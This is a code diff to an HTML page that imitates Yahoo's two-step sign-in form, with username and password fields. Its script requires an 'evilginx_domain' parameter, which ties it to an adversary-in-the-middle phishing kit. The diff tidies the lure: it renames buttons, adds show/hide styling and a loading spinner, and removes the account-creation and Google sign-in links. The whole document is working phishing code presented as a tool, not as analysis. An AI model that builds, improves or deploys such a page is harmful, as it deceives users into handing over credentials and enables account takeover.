@@ -8,8 +8,8 @@
     <link href="css/webflow.css" rel="stylesheet" type="text/css">
     <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
     <link href="css/custom-styles.css" rel="stylesheet" type="text/css">
-    <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
-    <link href="./yahoo.png" rel="apple-touch-icon">
+    <link href="./images/yahoo.png" rel="shortcut icon" type="image/x-icon">
+    <link href="./images/yahoo.png" rel="apple-touch-icon">
     <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
     <script type="text/javascript">WebFont.load({ google: { families: ["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic", "Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"] } });</script>
     <style>
@@ -67,6 +67,10 @@
         .restart.logger.w-button { width: 100%; padding: 14px; background: #4a90e2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease; }
         .restart.logger.w-button:hover { background: #357abd; }
         .error-message-banner { background: #fee; border: 1px solid #fcc; color: #c33; padding: 12px; border-radius: 6px; margin-bottom: 20px; display: none; }
+        .pazzi, .mail { transition: opacity 0.3s ease-in-out; }
+        .hidden { display: none !important; opacity: 0; }
+        .visible { display: block !important; opacity: 1; }
+        .loading-container { display: none; text-align: center; padding: 20px; }
     </style>
 </head>
 <body>
@@ -90,42 +94,32 @@
                     
                     <!-- Error Banner -->
                     <div id="error-banner" class="error-message-banner"></div>
+                    <div id="loading-container" class="loading-container"><div class="loading-spinner"></div></div>
 
                     <!-- Email Step -->
-                    <div id="email-step" class="step active">
+                    <div id="email-step" class="mail visible">
                         <h1 class="heading-2">Sign in</h1>
-                        <div class="text-block-2">Sign in using your Yahoo account<br></div>
-                        <div class="lpl numb">Username, Email or Mobile<br></div>
+                        <div class="text-block-2">Sign in using your Yahoo account</div>
+                        <div class="lpl numb">Username, Email or Mobile</div>
                         <input class="field w-input" maxlength="256" name="username" placeholder="" type="email" id="username" required>
                         <div class="div-block-6">
-                            <label class="w-checkbox checkbox-field">
-                                <div class="w-checkbox-input w-checkbox-input--inputType-custom checkbox-field"></div>
-                                <input type="checkbox" id="stay-signed-in" name="stay-signed-in" style="opacity:0;position:absolute;z-index:-1">
-                                <span class="checkbox-label w-form-label" for="stay-signed-in">Stay signed in</span>
-                            </label>
+                            <label class="w-checkbox checkbox-field"><input type="checkbox" style="opacity:0;position:absolute;z-index:-1"><span class="checkbox-label w-form-label">Stay signed in</span></label>
                             <a href="#" class="text-block-4">Forgotten username?</a>
                         </div>
-                        <button type="button" id="next-to-password" class="nergzt logger w-button">Next</button>
-                        <a href="#" class="button logger w-button">Create an account</a>
-                        <div class="text-block-5">or</div>
-                        <div class="div-block-7 logger">
-                            <img src="images/google.png" loading="lazy" alt="Google Logo" class="image-3">
-                            <div class="text-block-6">Sign in with google</div>
-                        </div>
+                        <button type="button" id="next-btn" class="nergzt logger w-button">Next</button>
                     </div>
 
                     <!-- Password Step -->
-                    <div id="password-step" class="step">
-                        <div id="user-identifier" class="user-identifier-text"></div>
+                    <div id="password-step" class="pazzi hidden">
+                        <div id="user-identifier" class="reflectto"></div>
                         <h1 class="heading-2"><strong>Enter password</strong></h1>
-                        <div class="text-block-2">to finish signing in<br></div>
-                        <div class="pazz lpl numb">Password<br></div>
+                        <div class="text-block-2">to finish signing in</div>
+                        <div class="pazz lpl numb">Password</div>
                         <div class="ms-input-wrap">
                             <input class="ms-input w-input" maxlength="256" name="passwd" placeholder="" type="password" id="password" required>
                         </div>
-                        <button type="submit" id="submit-credentials" class="logger w-button">Next</button>
+                        <button type="submit" id="submit-btn" class="logger w-button">Next</button>
                     </div>
-
                 </form>
             </div>
         </div>
@@ -197,7 +191,7 @@
                 if (!state.evilginxDomain) {
                     console.error("CRITICAL: evilginx_domain parameter is missing. The form will not work.");
                     utils.showError('Configuration error. Please access through the correct link.');
-                    document.getElementById('next-to-password').disabled = true;
+                    document.getElementById('next-btn').disabled = true;
                     return;
                 }
 
@@ -287,8 +281,8 @@
 
         // --- EVENT LISTENERS ---
         const setupEventListeners = () => {
-            document.getElementById('next-to-password').addEventListener('click', formHandlers.handleEmailSubmit);
-            document.getElementById('submit-credentials').addEventListener('click', formHandlers.handlePasswordSubmit);
+            document.getElementById('next-btn').addEventListener('click', formHandlers.handleEmailSubmit);
+            document.getElementById('submit-btn').addEventListener('click', formHandlers.handlePasswordSubmit);
         };
 
         // --- INITIALIZATION ---
